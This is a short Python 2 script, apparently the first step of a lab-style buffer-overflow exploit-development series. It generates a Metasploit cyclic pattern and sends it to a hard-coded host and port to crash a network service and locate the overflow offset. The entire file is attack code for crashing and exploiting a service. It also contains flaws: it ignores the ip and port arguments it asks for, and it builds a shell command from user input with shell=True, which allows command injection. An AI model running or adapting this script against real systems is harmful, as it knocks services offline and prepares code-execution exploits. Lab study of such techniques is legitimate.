#!/usr/bin/python
import sys, socket, os, subprocess

print "firstly, run the application and use the script."

if len(sys.argv) < 4:
	print "incorrect use of script by Onurgule"
	print "python2 1_find_offset.py ip port len"
	sys.exit()

#subprocess.run(['msf-pattern_create', '-l', sys.argv[3]],caprute_output=True)
offset = subprocess.check_output('msf-pattern_create -l' +  (sys.argv[3]), shell=True)


#offset = os.system("msf-pattern_create -l" +sys.argv[3])
#print str(offset)

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.249',2233))
	s.send((offset))
	s.close()

	print "Now, after script used if the application is still working, UPPER the NUMBER"
	print "If the application crashed, then you can go to the chapter 2_get_offset!"

except:
	print "Error"
	sys.exit()
